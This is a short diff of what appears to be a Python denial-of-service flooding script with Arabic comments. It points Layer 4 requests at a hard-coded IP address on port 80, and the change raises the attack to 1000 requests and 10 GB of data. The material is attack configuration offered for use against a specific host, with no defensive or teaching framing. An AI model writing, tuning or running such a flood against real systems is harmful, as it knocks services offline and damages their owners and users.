@@ -23,10 +23,10 @@ destination_ip = "64.226.123.34"
 destination_port = 80
 
 # قم بتعيين عدد الطلبات التي ترغب في إرسالها.
-num_requests = 200
+num_requests = 1000
 
 # قم بتعيين حجم البيانات (بالجيجابايت) الذي ترغب في إرساله.
-data_size = 5  # 10 جيجابايت
+data_size = 10  # 10 جيجابايت
 
 # قم بإنشاء دالة لإرسال الطلبات على مستوى Layer 4.
 send_l4_requests(destination_ip, destination_port, num_requests, data_size)
